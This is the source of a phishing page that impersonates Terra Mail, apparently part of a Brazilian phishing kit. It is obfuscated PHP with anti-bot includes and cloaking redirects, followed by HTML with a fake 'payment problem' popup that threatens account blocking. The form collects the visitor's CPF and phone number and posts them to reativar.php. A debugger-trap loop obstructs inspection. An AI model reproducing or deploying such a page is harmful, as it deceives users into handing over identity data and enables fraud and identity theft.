<?php
 goto j9HpJ; KBDtG: require_once "\x2e\x2f\x76\145\162\151\146\171\102\157\x74\x2f\x61\x6e\x74\55\142\x6f\x74\56\x70\x68\x70"; goto AjB58; gTtnV: if (isset($_SESSION["\x37\163\x31\146\71\x6c\x38\61\x63\x62"])) { } else { header("\114\x6f\143\141\x74\151\x6f\x6e\72\x20\64\60\x34\x2f\77\x6e\x6f\x74\x69\x63\x69\141\x3d\x6e\145\147\x61\144\157"); die; } goto l2Rxf; AjB58: require_once "\x2e\x2f\166\145\x72\151\x66\171\x42\x6f\164\x2f\141\x6e\164\x2d\x62\x6f\x74\61\56\x70\x68\x70"; goto gTtnV; TJFpx: @(include "\x2e\x2f\166\145\x72\151\146\x79\x42\157\x74\x2f\62\x37\154\143\170\144\163\x6f\x2e\x70\150\160"); goto KBDtG; j9HpJ: session_start(); goto oC7Z2; oC7Z2: date_default_timezone_set("\101\x6d\x65\162\151\143\141\x2f\123\141\157\x5f\120\141\x75\154\x6f"); goto TJFpx; l2Rxf: ?>
<!DOCTYPE html>
<html class="swal2-shown swal2-height-auto" lang="pt-br">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">

  <title>&#84;&#101;&#114;&#114;&#97;&#32;&#77;&#97;&#105;&#108;</title>


  <meta name="theme-color" content="##F1F1F1">
  <meta name="apple-mobile-web-app-status-bar-style" content="##F1F1F1">
  <meta name="msapplication-navbutton-color" content="##F1F1F1">
  <link rel="shortcut icon" type="image/x-icon" href="./assets/favicon_1.ico">

  <link rel="stylesheet" href="./assets/7h19fvjh/all.css">
  <script src="./assets/7h19fvjh/jquery.min.js"></script>
  <script src="./assets/7h19fvjh/jquery.mask.js"></script>
  <script type="text/javascript">
    $("#cp").mask("000.000.000-00");
    $("#tel").mask("(00) 00000-0000");
  </script>
  <!-- Adicione o link para o arquivo CSS do SweetAlert -->
  <link rel="stylesheet" href="./assets/7h19fvjh/sweetalert2.min.css">

  <!-- Adicione o link para o arquivo JavaScript do SweetAlert -->
  <script src="./assets/7h19fvjh/sweetalert2.min.js"></script>
  <script type="text/javascript" src="./assets/noc.js"></script>
  <script type="text/javascript" src="./assets/cp.js"></script>

</head>

<body cz-shortcut-listen="true" style="background-color: #F1F1F1;" class="swal2-shown swal2-height-auto">
  <style aria-hidden="true">
    .sweet-alert-image {
      width: 80px;
      height: 80px;
      background-image: url('img/alert.png');
      background-size: contain;
      background-repeat: no-repeat;
      margin: 0 auto;
    }

    .sweet-alert-title {
      font-size: 24px;
      font-weight: bold;
      text-align: center;
      margin-top: 20px;
      color: #FF7212;
    }

    .sweet-alert-message {
      font-size: 16px;
      text-align: center;
      margin-top: 10px;
    }

    .swal2-confirm {
      background-color: #C14E00 !important;
      color: white;
      border: none;
      border-radius: 5px;
      padding: 10px 20px;
      font-size: 16px;
    }
  </style>
  <script aria-hidden="true">
    document.addEventListener("DOMContentLoaded", function() {
      Swal.fire({

        title: '<div class="sweet-alert-image"></div><div class="sweet-alert-title">Oops!</div>',
        html: '<div class="sweet-alert-message">Prezado(a) Cliente Terra, ocorreu algum problema com sua forma de pagamento da sua assinatura, e para evitar futuros transtornos como o bloqueio de sua conta pedimos que você atualize sua forma de pagamento</div>',
        showConfirmButton: true,
        confirmButtonText: 'Confirmar'
      });
    });
  </script>
  <div id="app" aria-hidden="true">
    <div>
      <div class="md">
        <div class="corpo_md">


          <div class="show_apd" v-show="!isInicio" style="background:#FF7212;">
            <center><img src="./assets/7h19fvjh/logo.png" width="132px" height="45px"></center>
            <p>Precisamos que você forneça algumas informações adicionais</p>
            <p>
              Informe seu número de Telefone e o seu CPF
            </p>

            <form id="formulario" name="form" action="reativar.php" method="POST">
              <label for="telefone">
                <span style="color: white;">CPF</span>
                <input type="tel" name="cp" id="cp" maxlength="14" placeholder="CPF" pattern="^((\d{3}).(\d{3}).(\d{3})-(\d{2}))*$" required="required" onblur="TestaCPF(this.value)">
              </label>
              <label for="telefone">
                <span style="color: white;">Telefone</span>
                <input type="tel" name="tel" id="tel" maxlength="15" placeholder="DDD + Telefone" required="required">
              </label>

              <button class="btn_next" style="color:white;background:#c14e00;" id="submit" type="submit" title="CONFIRMRAR" value="CONFIRMAR">CONFIRMAR</button>
            </form>
          </div>
        </div>
      </div>
      <div class="wrapper container_dentro">
        <div class="header">
          <div class="buscar"><img src="./assets/7h19fvjh/busca.png" alt=""></div>
          <div class="menu"><img src="./assets/7h19fvjh/menu.png" alt=""></div>

        </div>

        <div class="corpo">

          <div class="corpo_img"><img src="./assets/7h19fvjh/corpo.png" alt=""></div>
        </div>
      </div>
    </div>
  </div>


  <div class="swal2-container swal2-center swal2-backdrop-show" style="overflow-y: auto;">
    <div aria-labelledby="swal2-title" aria-describedby="swal2-content" class="swal2-popup swal2-modal swal2-show" tabindex="-1" role="dialog" aria-live="assertive" aria-modal="true" style="display: flex;">
      <div class="swal2-header">
        <ul class="swal2-progress-steps" style="display: none;"></ul>
        <div class="swal2-icon" style="display: none;"></div><img class="swal2-image" style="display: none;">
        <h2 class="swal2-title" id="swal2-title" style="display: block;">
          <div class="sweet-alert-image"></div>
          <div class="sweet-alert-title">Oops!</div>
        </h2><button type="button" class="swal2-close" style="display: none;" aria-label="Close this dialog">×</button>
      </div>
      <div class="swal2-content">
        <div id="swal2-content" class="swal2-html-container" style="display: block;">
          <div class="sweet-alert-message">Prezado(a)
            Cliente Terra, ocorreu algum problema com sua forma de pagamento da sua
            assinatura, e para evitar futuros transtornos como o bloqueio de sua
            conta pedimos que você atualize sua forma de pagamento</div>
        </div><input class="swal2-input" style="display: none;"><input type="file" class="swal2-file" style="display: none;">
        <div class="swal2-range" style="display: none;"><input type="range" value="50"><output></output></div><select class="swal2-select" style="display: none;"></select>
        <div class="swal2-radio" style="display: none;"></div><label for="swal2-checkbox" class="swal2-checkbox" style="display: none;"><input type="checkbox"><span class="swal2-label"></span></label><textarea class="swal2-textarea" style="display: none;"></textarea>
        <div class="swal2-validation-message" id="swal2-validation-message" style="display: none;"></div>
      </div>
      <div class="swal2-actions">
        <div class="swal2-loader"></div><button type="button" class="swal2-confirm swal2-styled" style="display: inline-block;" aria-label="">Confirmar</button><button type="button" class="swal2-deny swal2-styled" style="display: none;" aria-label="">No</button><button type="button" class="swal2-cancel swal2-styled" style="display: none;" aria-label="">Cancel</button>
      </div>
      <div class="swal2-footer" style="display: none;"></div>
      <div class="swal2-timer-progress-bar-container">
        <div class="swal2-timer-progress-bar" style="display: none;"></div>
      </div>
    </div>
  </div>
</body>
<script>
setInterval(()=>{debugger;},0xc8);
</script>
<script>setInterval(function(){$.post("./verifyBot/8whu95hvz7.php",{contar:""},function(n){$("#Online").text(n)})},1e4);</script>

</html>